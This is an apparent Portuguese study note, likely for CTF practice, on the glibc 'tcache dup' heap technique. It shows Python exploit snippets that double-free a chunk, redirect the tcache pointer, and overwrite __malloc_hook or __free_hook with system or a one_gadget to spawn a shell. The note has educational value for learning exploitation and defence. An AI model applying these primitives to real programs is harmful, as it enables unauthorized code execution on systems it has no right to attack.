- [Dup](#dup)
  - [Obs >= 2.29](#obs--229)
- [Exec](#exec)

O TCache dup é o fastbins dup, mas realizado na estrutura similar 
presente no tcache

Em versões ate 2.29, nem se quer existe a mitigação igual dos fastbins, então 
basta fazer free(chunk_A) free(chunk_A)

Dali em diante, vc precisa usar a seguinte tecnica (igual o fastbin dup):

# Dup
O Tcache facilita o exploit, nao tendo mitigação de double free nem check no 
size (então nao precisamos de find_fake_fast)

Para dar write é similar ao fastbin dup, mas ao invés de mirarmos no `alvo-16`, 
basta mirar no alvo... o tcache tem os seus fds apontando para a `data` do chunk

```py
chunk_A = malloc(0x18, "A"*8)

free(chunk_A)
free(chunk_A)

chunk_Corromper = malloc(0x18, p64(ALVO))
chunk_A = malloc(0x18, "A"*8) # Consumir
chunk_Write = malloc(0x18, "ola! :D")
```

Estranhamente, o valor do `count 0x20` da a volta e vai para 
`0xff`, isso quer dizer que nem sendo usado para chegar se pode 
alocar ele ta

## Obs >= 2.29
Nessa versões, voce precisa usar o método da transferência pra 
ignorar a mitigação da key

- Free 7 chunks no tcache 0x20 (tcache_count=7)
- Double free no fast 0x20
- Aloca 7 chunks (esvaziando o tcache 0x20)
- Aloca 1 chunk 
  - transfere o fast 0x20 -> tcache 0x20
  - Consequentemente, o chunk dupado
- Altera o fd

E assim temos o nosso dup :D

# Exec 

Para conseguir uma shell, basta mirar no malloc_hook (ou outro)

Caso a sua versão tenha check no size, voce vai precisar usar 
find_fake_fast (E lembrando q find_fake_fast aponta para o inicio do chunk, então como estamos usando o TCache, voce precisa +16)


```py
chunk_A = malloc(0x18, "A"*8)

free(chunk_A)
free(chunk_A)

chunk_Corromper = malloc(0x18, p64(libc.sym.__malloc_hook))
chunk_A = malloc(0x18, "A"*8) # Consumir
chunk_Write = malloc(0x18, p64(libc.sym.system))
malloc(p64(next(libc.search(b"/bin/sh\0"))))


    (lembrando que o free_hook é fácil de corromper nesse 
    caso pq o endereço nao precisa ser alinhado a 16 bytes
    (o tcache é ruim, lembra?))

Para ser mais eficiente no numero de mallocs, voce também pode: 
    chunk_Corromper = malloc(0x18, p64(libc.sym.__free_hook))
    chunk_A = malloc(0x18, "/bin/sh\0") # Consumir
    chunk_Write = malloc(0x18, p64(libc.sym.system))
    free(chunk_A)

ou apontar para um one_gadget e ativar o hook
    chunk_Corromper = malloc(0x18, p64(libc.sym.__free_hook))
    chunk_A = malloc(0x18, "A"*8) # Consumir
    chunk_Write = malloc(0x18, p64(libc.address+ 0x41a06))
    free(12345) # O arg nao importa pra one_gadget

```